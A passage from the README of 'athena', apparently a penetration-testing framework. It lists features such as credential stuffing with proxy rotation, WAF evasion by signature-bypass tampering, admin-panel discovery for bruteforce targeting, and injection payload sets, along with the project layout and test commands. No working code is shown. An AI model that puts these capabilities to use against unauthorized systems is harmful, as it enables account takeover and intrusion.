5. **AI Integration** — Gemini-powered analysis for finding correlation, prioritization, attack-path reasoning, and report generation. Requires `GEMINI_API_KEY` environment variable.

6. **Finding Correlation** — Cross-module deduplication, relationship detection, and impact aggregation. Works deterministically without AI; AI can enhance results when enabled.

7. **Rate Limiting** — Per-engagement rate limiting with sliding window, burst control, and violation tracking. Integrates with the REST API server.

8. **Pipeline Orchestration** — 11-stage PTES-aligned pipeline with independent stage execution, failure isolation, structured states, and artifact hand-off (`--list-stages`, `--stage`, `--preflight`).

9. **Operator Control** — Fail-closed `OperationGate` with preflight explanations, scope/technique/confirmation gating, audit, rate limits, and verified cleanup registration.

10. **Multi-provider AI with failover** — Gemini/Groq/DeepSeek with automatic failover (`last_provider`).

11. **WAF Detection & Evasion** — Passive fingerprinting (~90 WAF signatures) plus active challenge probes with deterministic signature-bypass tamper transforms. Integrated into discovery and vuln scan phases (`modules/waf.py`).

12. **Credential Stuffing** — Replays user:pass pairs against discovered login forms with cookie seeding, CSRF auto-harvest, HTTP Basic auth fallback, proxy rotation, adaptive backoff on 429/403, and AI credential ranking (`--creds-file`, `--cookie-file`, `--ai-creds`).

13. **Aggressive Directory Enumeration** — 1200+ bundled entries, extension fuzzing, robots.txt/sitemap harvesting, soft-404 filtering, recursive scanning up to `--dir-depth N`.

14. **Admin Panel Detection** — Probes 60+ admin paths (cPanel, WHM, webmail, phpMyAdmin, WordPress, Joomla), auto-extracts login forms for bruteforce targeting.

15. **Enhanced Injection Payloads** — SQLi: 28 payloads (was 4); XSS: 25 payloads (was 3); Command Injection: 30 payloads (was 4).

### Orchestration seams (stages without autonomous modules)

The pipeline's **control stages** are fully implemented (gating, isolation, artifact contracts, dependency handling), but do not yet run autonomous modules. Running them reports a structured `STAGE_NOT_IMPLEMENTED` error instead of executing — this is deliberate, not a crash:

- `engagement`, `recon`, `validation`, `initial_access`, `post_exploitation_assessment`, `attack_path_analysis`, `impact_assessment`

Module-backed stages that run real work today: `discovery`, `enumeration`, `scanning`, `reporting`.

---

## Project layout

```
athena/
├── athena.py              # CLI entry point + scan orchestrator
├── requirements.txt
├── run.bat                # Windows wrapper
├── Dockerfile             # runs the REST API server (`CMD ["--api"]`)
├── .env.example           # configuration template
├── config/payloads.json   # WAF-bypass & payload templates
├── modules/               # core framework modules
│   ├── ai_integration.py      # Multi-provider LLM (failover): correlation, prioritization, attack paths
│   ├── finding_correlation.py # Cross-module dedup, relationship detection
│   ├── rate_limiter.py        # Per-engagement rate limiting
│   ├── orchestration.py       # 11-stage pipeline, StageState, StructuredError
│   ├── operation_control.py   # OperationGate: preflight, authorization, gating
│   ├── cleanup_manager.py     # Verified temporary-artifact cleanup
│   ├── post_exploitation/     # 7-phase post-exploitation chain
│   └── ... (other modules)
├── plugins/               # auto-discovered BasePlugin extensions
├── extension/             # Chrome extension (talks to the REST API server)
├── docs/                  # USER_GUIDE.md, API_REFERENCE.md
├── tests/                 # pytest suite (conftest, api, scanner, post, …)
└── .github/workflows/     # CI (lint / security / test / docker)
```

---

## Development

```powershell
python -m pytest tests/ -v
```

Linting / static checks (as in CI):
```powershell
flake8 athena.py modules/ --max-line-length=140 --ignore=E402,W503,E203
bandit -r athena.py modules/ --skip B101,B307,B311
```

**Test coverage:** 571 tests passing, including:
- `tests/test_ai_integration.py` — AI correlation, prioritization, attack paths, dedup, provider failover
- `tests/test_finding_correlation.py` — Deduplication, relationships, impact aggregation
- `tests/test_rate_limiter.py` — Rate limiting, burst control, violation tracking
- `tests/test_orchestration.py` — Stage registry, structured errors, single-stage + pipeline execution, isolation
- `tests/test_operation_control.py` — Preflight plans, authorization chain, confirmation gating, guarded execution
- `tests/test_cleanup_manager.py` — Verified removal, scrubbing, failure isolation, retry semantics
- `tests/test_audit_operations.py` — Structured audit schema, trail read-back, gate/orchestrator/cleanup audit events

**Implemented in this repo:** the REST API server (`run_web_server`, endpoints from `docs/API_REFERENCE.md`, background job runner `_run_background_scan`, `--api`, numeric mode aliases, `--unsafe`) — covered by `tests/test_api.py` (37 passing tests).
